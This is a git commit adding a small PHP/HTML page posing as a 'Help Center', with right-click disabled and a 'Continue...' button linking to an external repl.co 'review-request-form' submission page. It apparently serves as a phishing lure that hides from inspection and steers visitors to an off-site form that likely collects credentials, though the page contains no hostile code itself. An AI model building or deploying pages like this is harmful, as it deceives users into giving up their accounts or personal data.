664bc9c96d0d15c197af974f2a74de3c4d881d4c
jamelenroyy <147218489+jamelenroyy@users.noreply.github.com>
2023-10-10 05:21:06 +0500

    Create index.php

---
+++ public/index.php
@@ -0,0 +1,12 @@
+<!DOCTYPE html>
+<html oncontextmenu="return false">
+<head>
+  <title>Help Center</title>
+  <link rel="stylesheet" href="style.css">
+  <script type="text/javascript" src="script.js"></script>
+</head>
+<body>
+  <h1>Welcome to Help Center</h1><a href=
+  "https://submit.review-request-form.repl.co/action-submit.html"><button class="button">Continue...</button></a>
+</body>
+</html>
